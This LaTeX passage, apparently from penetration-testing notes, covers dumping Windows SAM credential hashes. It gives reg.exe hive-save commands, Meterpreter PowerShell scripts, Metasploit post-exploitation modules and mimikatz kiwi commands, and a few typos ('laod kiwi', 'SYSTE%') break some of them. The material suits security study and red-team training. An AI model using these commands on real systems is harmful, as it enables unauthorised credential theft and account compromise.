\section{SAM dumping}
See~\ref{win:SAM} is found in \verb+C:\Windows\System32\config+ and passwords  that are
hashed and saved in SAM can found in the registry
Editor and navigate yourself to i\verb+HKEY_LOCAL_MACHINE\SAM.+

When the Windows operating system is running, the hives are in use and mounted.
When Windows is not running, the hives are not mounted and they can be copied
just like any other file.


SAM secrets can be dumped locally or remotely from the mounted registry hives.
These secrets can also be extracted offline from the exported hives. 



With a local acdmin access there arethree registry hives to consider. Each will have a specific purpose: 
\begin{itemize}
    \item \verb+HKLM\SAM+: Contains the hashes associated with local account
        passwords. 
    \item \verb+HKLM\SYSTE%+: Contains the system bootkey, which is used to encrypt the SAM database. 
    \item \verb+HKLM\SECURITY+: Contains cached credentials for domain accounts. 
\end{itemize}


\subsection{Local dumping registry hives}
Backups are created using the \verb+reg.exe+ utility.
\begin{verbatim}
C:\WINDOWS\system32> reg.exe save hklm\sam C:\sam.save
C:\WINDOWS\system32> reg.exe save hklm\system C:\system.save
C:\WINDOWS\system32> reg.exe save hklm\security C:\security.save
\end{verbatim}


Mimikatz~\ref{tool:mimikatz:cred-dumping} can also be used.


\subsection{Offline dumping}
Tools to use:
\begin{itemize}
    \item Impacket's secretsdump.py\ref{tool:impacket:secretsdump:offline} 
    \item Mimikatz~\ref{tool:mimikatz:cred-dumping}
\end{itemize}


\subsection{Remote dumping registry hives}
Tools to use:
\begin{itemize}
    \item Impacket's secretsdump.py\ref{tool:impacket:secretsdump:remote:SAM} 
    \item CrackMapExec~\ref{tool:crackmapexec:smb:cred-dumping}
\end{itemize}

\subsubsection{Metasploit for Windows 7}

\textbf{Invoke-Powerdump.ps1}

The method of Metasploit involves PowerShell. After getting the  meterpreter session, access windows PowerShell by using the command load PowerShell. And then use the following set of commands to run the Invoke-PowerDump.ps1 script.


\begin{verbatim}
powershell_import /root/powershell/Invoke-PowerDump.ps1
powershell_execute Invoke-PowerDump

meterpreter > load powershell
meterpreter >  powershell_import /root/.../Invoke-Powerdump.ps1
meterpreter > powershell_execute Invoke-Powerdump
\end{verbatim}



\textbf{Get-PassHashes.ps1}

\begin{verbatim}
powershell_import /root/powershell/Get-PassHashes.ps1
powershell_execute Get-PassHashes

meterpreter > load powershell
meterpreter >  powershell_import /root/.../Get-PassHashes.ps1
meterpreter > powershell_execute Get-PassHashes
\end{verbatim}

\subsubsection{Metasploit Windows 10}

\textbf{hashdump}

When you have a meterpreter session of a target, just run hashdump command and it will dump all the hashes from SAM file of the target system. The same is shown in the image below:

Another way to dump hashes through  hashdump module is through a post exploit that Metasploit offers. To use  the said exploit, use the following set of commands:

\begin{verbatim}
use post/windows/gather/hashdump
set session 1
exploit
\end{verbatim}


\verb+credential_collector+

\begin{verbatim}
use post/windows/gather/credential/credential_collector
set session 1
exploit
\end{verbatim}


\textbf{load kiwi}

The next method that Metasploit offers are by firing up the mimikatz module. To load mimikatz, use the load kiwi command and then use the following command to dump the whole SAM file using mimikatz.

\begin{verbatim}
meterpreter >  laod kiwi
meterpreter > lsa_dump_sam
\end{verbatim}


\subsection{Links}
\url{https://attack.mitre.org/techniques/T1003/002/}
